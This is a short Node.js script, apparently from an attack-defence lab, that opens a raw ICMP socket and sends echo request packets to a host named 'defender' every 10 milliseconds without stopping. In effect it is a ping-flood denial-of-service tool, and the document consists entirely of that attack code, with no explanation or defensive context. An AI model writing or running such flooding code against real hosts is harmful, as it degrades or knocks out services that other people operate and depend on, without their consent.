
const raw = require('raw-socket');
const target = { address: 'defender' };

const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });

const sendIcmpPacket = () => {
    const buffer = Buffer.alloc(16);
    buffer.writeUInt8(8, 0); // Type: Echo (8)
    buffer.writeUInt8(0, 1); // Code: No Code (0)

    socket.send(buffer, 0, buffer.length, target.address, () => {});
};

setInterval(sendIcmpPacket, 10);
